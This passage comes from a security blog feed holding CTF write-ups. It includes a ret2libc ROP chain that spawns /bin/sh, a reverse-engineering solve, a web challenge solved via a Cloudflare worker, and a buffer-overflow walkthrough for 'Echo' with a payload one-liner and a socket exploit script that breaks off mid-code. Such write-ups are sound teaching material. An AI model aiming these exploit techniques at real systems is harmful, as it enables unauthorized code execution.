+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bin_sh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;/bin/sh&lt;/span>&lt;span class="se">\x00&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">system&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">system&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">72&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ret&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># Align stack to 16 bytes (ABI requirement)` &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pop_rdi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># (1st argument for `system`) &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bin_sh&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># Address of &amp;#34;/bin/sh&amp;#34; string in libc` &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">system&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1"># Call `system` `` &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xdeadbeef&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Optional exit (not critical)` &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">)[:&lt;/span>&lt;span class="mi">127&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1"># Trim to 127 bytes` &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The Script will:&lt;/p>
+&lt;ol>
+&lt;li>Leak Libc Address by using &lt;code>puts&lt;/code> to print out the address of &lt;code>puts&lt;/code> function and calculate it to find the &lt;code>libc&lt;/code> base address&lt;/li>
+&lt;li>Execute &lt;code>system(&amp;quot;/bin/sh&amp;quot;)&lt;/code> using leaked libc&amp;rsquo;s address.&lt;/li>
+&lt;/ol>
+&lt;p>After that, I execute the python script I successfully enter to the instance given then I use &lt;code>cat /flag&lt;/code> (based on the Dockerfile given) to get the flag content. Boom flag found.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image20.png"
+width="940"
+height="836"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image20_hu1aecfa07683e40fdfce52361bed85f87_475177_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image20_hu1aecfa07683e40fdfce52361bed85f87_475177_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="112"
+data-flex-basis="269px"
+>&lt;br>
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image21.png"
+width="471"
+height="46"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image21_hu7fe11c099eb581402f54788f016a82b0_10526_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image21_hu7fe11c099eb581402f54788f016a82b0_10526_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="1023"
+data-flex-basis="2457px"
+>&lt;/p>
+&lt;p>Flag: umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}&lt;/p>
+&lt;h1 id="reverse-engineering-htpp-server">&lt;strong>Reverse Engineering: htpp-server&lt;/strong>&lt;/h1>
+&lt;p>First I check if the given file belongs to which type using the &lt;code>file&lt;/code> command.
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image-file.png"
+width="940"
+height="56"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image-file_hu4384d1d37d3d3e2b02928dbf364a6055_72580_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image-file_hu4384d1d37d3d3e2b02928dbf364a6055_72580_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="1678"
+data-flex-basis="4028px"
+>
+Notice that this is a ELF 64-bit executable file so I opened up with Ghidra to decompile it to view the source code.&lt;br>
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image23.png"
+width="940"
+height="300"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image23_hub072f38c807a20a9115d6d8808fc986a_64026_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image23_hub072f38c807a20a9115d6d8808fc986a_64026_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="313"
+data-flex-basis="752px"
+>&lt;br>
+Entry Function for the program&lt;br>
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image24.png"
+width="911"
+height="1043"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image24_hu7dc56f614498135e8e20b27139df0391_309671_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image24_hu7dc56f614498135e8e20b27139df0391_309671_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="87"
+data-flex-basis="209px"
+>&lt;br>
+Content of FUN_001013a9&lt;/p>
+&lt;p>&lt;strong>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image25.png"
+width="969"
+height="774"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image25_hu94a259d933785ae853ed3d7af7ed569e_191143_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image25_hu94a259d933785ae853ed3d7af7ed569e_191143_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="125"
+data-flex-basis="300px"
+>&lt;/strong>&lt;br>
+Content of FUN_0010154b&lt;br>
+The pictures above show that the program is started with the c runtime library and calling the main function which is &lt;strong>FUN_001013a9&lt;/strong>. Then, I roughly viewed the code and found that the program listens to an 8080 port with a specific address and creates a subprocess to run the function named &lt;strong>FUN_0010154b.&lt;/strong> After that, I found that the &lt;strong>strstr()&lt;/strong> function is used to find the string input that contains “&lt;strong>GET /goodshit/umcs_server HTTP/13.37&lt;/strong>”. Then I connect to the machine using the &lt;code>nc&lt;/code> command and input the string given. Boom the flag will be shown.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image26.png"
+width="556"
+height="234"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image26_hua0f1e6541eb3a490107ad903004d92c8_36331_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image26_hua0f1e6541eb3a490107ad903004d92c8_36331_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="237"
+data-flex-basis="570px"
+>&lt;/p>
+&lt;p>umcs{http_server_a058712ff1da79c9bbf211907c65a5cd}&lt;/p>
+&lt;h2 id="web-microservices-solve-after-preliminary-round-end">&lt;strong>Web: Microservices （SOLVE AFTER PRELIMINARY ROUND END）&lt;/strong>&lt;/h2>
+&lt;p>&lt;strong>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image27.png"
+width="494"
+height="502"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image27_hu6b3ee89c663ebe54c595a550e3e192ff_18959_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image27_hu6b3ee89c663ebe54c595a550e3e192ff_18959_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="98"
+data-flex-basis="236px"
+>&lt;/strong>&lt;/p>
+&lt;p>&lt;strong>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image28.png"
+width="416"
+height="325"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image28_hu6bc37e830ccf1c397571cdb19007e558_10087_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image28_hu6bc37e830ccf1c397571cdb19007e558_10087_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="128"
+data-flex-basis="307px"
+>&lt;/strong>&lt;/p>
+&lt;p>Content of flag-api Dockerfile&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image29.png"
+width="959"
+height="994"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image29_hubd1a8f5a9c7680ba8b34e6f4845d0e4e_323687_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image29_hubd1a8f5a9c7680ba8b34e6f4845d0e4e_323687_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="96"
+data-flex-basis="231px"
+>&lt;/p>
+&lt;p>Content of flag-api nginx.conf&lt;/p>
+&lt;p>After viewing the files from the folder flag-api I found that the flag-api instance is exposing the port 5555 to public and another nginx configuration was written to allow Cloudflare IPs to access it. So I opened up my cloudflare account and created a worker with a “Hello world” template. Then I edit the code from IDE and preview it. Boom, the flag has been found.&lt;/p>
+&lt;p>&lt;strong>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image30.png"
+width="940"
+height="530"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image30_hu57432e4644ec262ed4eb273f1de90792_132939_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image30_hu57432e4644ec262ed4eb273f1de90792_132939_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="177"
+data-flex-basis="425px"
+>&lt;/strong>
+Source code for worker.js&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image31.png"
+width="505"
+height="153"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image31_hu0c1817aba12849cb04c98f5e7c83ca18_8972_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image31_hu0c1817aba12849cb04c98f5e7c83ca18_8972_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="330"
+data-flex-basis="792px"
+>&lt;/p>
+&lt;p>Flag: &lt;strong>UMCS{w0w_1m_cur1ous_on_h0w_y0u_g0t_h3r3}&lt;/strong>&lt;/p></description></item><item><title>Echo</title><link>https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/</link><pubDate>Sun, 30 Mar 2025 00:00:00 +0800</pubDate><guid>https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/</guid><description>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/featured-image-FTF-25.png" alt="Featured image of post Echo" />&lt;h2 id="snapshot">Snapshot&lt;/h2>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/banner.png"
+width="616"
+height="318"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/banner_hu2e62f561e399a449beab975235cda75c_26225_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/banner_hu2e62f561e399a449beab975235cda75c_26225_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Challenge SnapShot"
+class="gallery-image"
+data-flex-grow="193"
+data-flex-basis="464px"
+>&lt;/p>
+&lt;h2 id="writeup">Writeup&lt;/h2>
+&lt;p>I Start by downloading the binary and decompiling using online decompiler &lt;a class="link" href="https://binary.ninja/" target="_blank" rel="noopener"
+>Binary Ninja&lt;/a>. The Binary is a 64-bit ELF file. The decompiled code shows that the binary has a function called &lt;code>echo&lt;/code> which takes a string as input and prints it to the console. The binary also has a function called &lt;code>main&lt;/code> which calls the &lt;code>echo&lt;/code> function with a hardcoded string.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/binary-ninja.png"
+width="589"
+height="254"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/binary-ninja_hu133a6b41456b606b92bcb8e740a9c93c_15432_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/binary-ninja_hu133a6b41456b606b92bcb8e740a9c93c_15432_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Decompiled from binary ninja"
+class="gallery-image"
+data-flex-grow="231"
+data-flex-basis="556px"
+>&lt;/p>
+&lt;p>Notice that the &lt;code>main&lt;/code> function calls the &lt;code>gets&lt;/code> function which can be exploited to perform a buffer overflow attack. The &lt;code>gets&lt;/code> function does not check the length of the input string, which means that we can overflow the buffer and overwrite the return address of the &lt;code>main&lt;/code> function. This allows us to execute arbitrary code.&lt;/p>
+&lt;p>I will use the &lt;code>gdb&lt;/code> debugger to analyze the binary and find the address of the &lt;code>win&lt;/code>function.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb.png"
+width="451"
+height="440"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb_hud3dd94f7753eb481d75f41590ce088b0_77792_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb_hud3dd94f7753eb481d75f41590ce088b0_77792_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="GDB win function"
+class="gallery-image"
+data-flex-grow="102"
+data-flex-basis="246px"
+>&lt;/p>
+&lt;p>then I use the python command to create a pattern of 137 bytes and then run the binary with that input to test the buffer overflow.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/python.png"
+width="561"
+height="121"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/python_hu21a8a85ecef8458142f5b30e89d33d83_32885_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/python_hu21a8a85ecef8458142f5b30e89d33d83_32885_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Try input string in python"
+class="gallery-image"
+data-flex-grow="463"
+data-flex-basis="1112px"
+>&lt;/p>
+&lt;p>then I run the binary in &lt;code>gdb&lt;/code> and check the stack to see if the return address has been overwritten.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack.png"
+width="526"
+height="551"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack_hud2e268441d8a54ee6ae0d2c47196a090_96133_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack_hud2e268441d8a54ee6ae0d2c47196a090_96133_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="GDB check stack"
+class="gallery-image"
+data-flex-grow="95"
+data-flex-basis="229px"
+>&lt;/p>
+&lt;p>Notice that the rbp (x64 stack pointer) points has been overwritten with the address. So I try input another character to see if the return address which on rip (x64 stack pointer) has been overwritten.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack-2.png"
+width="1426"
+height="647"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack-2_hufe60d77d97062bfaba572ac1ab8166d7_219750_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack-2_hufe60d77d97062bfaba572ac1ab8166d7_219750_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="GDB check stack"
+class="gallery-image"
+data-flex-grow="220"
+data-flex-basis="528px"
+>&lt;/p>
+&lt;p>I found that the return address has been written to 0x4242424242. So I use python to create a payload that will overwrite the return address with the address of the &lt;code>win&lt;/code> function which is &lt;code>0x0000000000401216&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">python&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="s1">&amp;#39;print &amp;#34;A&amp;#34;*136 + &amp;#34;&lt;/span>&lt;span class="se">\x16\x12\x40\x00\x00\x00&lt;/span>&lt;span class="s1">&amp;#34;&amp;#39;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Before running the binary, I make a fake &lt;code>flag.txt&lt;/code> file to check if the binary is running the &lt;code>win&lt;/code> function. The &lt;code>win&lt;/code> function is supposed to read the flag from the &lt;code>flag.txt&lt;/code> file and print it to the console.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;FTF{this_is_a_fake_flag}&amp;#34;&lt;/span> &amp;gt; flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then I run the binary with the payload and check the output.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./echo &amp;lt; payload.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow-attack.png"
+width="1391"
+height="91"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow-attack_hu72cb7b622379e2d20752813bbf75a98b_31230_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow-attack_hu72cb7b622379e2d20752813bbf75a98b_31230_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="buffer-overflow-attack"
+class="gallery-image"
+data-flex-grow="1528"
+data-flex-basis="3668px"
+>&lt;/p>
+&lt;p>Ta-da! I got the flag. The flag is &lt;code>FTF{this_is_a_fake_flag}&lt;/code>.
+The binary is vulnerable to buffer overflow attacks and can be exploited to execute arbitrary code. The &lt;code>gets&lt;/code> function is the main vulnerability in this binary. It is important to always check the length of the input string when using functions like &lt;code>gets&lt;/code> to prevent buffer overflow attacks.&lt;/p>
+&lt;p>Next, we create a script to exploit the binary on the server. The script will create a payload that will overwrite the return address with the address of the &lt;code>win&lt;/code> function and then run the binary with the payload.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">socket&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">exploit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;Sends the payload and receives the echoed text.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">create_connection&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Receive the initial prompt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prompt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;latin-1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">errors&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ignore&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Or utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Received prompt: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">prompt&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Send the payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Send a newline character, very important.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Receive the echoed text (and any other responses)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4096&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;latin-1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">errors&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ignore&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Or utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Received response: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">response&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="ne">ConnectionRefusedError&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Connection refused to &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">:&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">port&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="ne">Exception&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;An error occurred: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
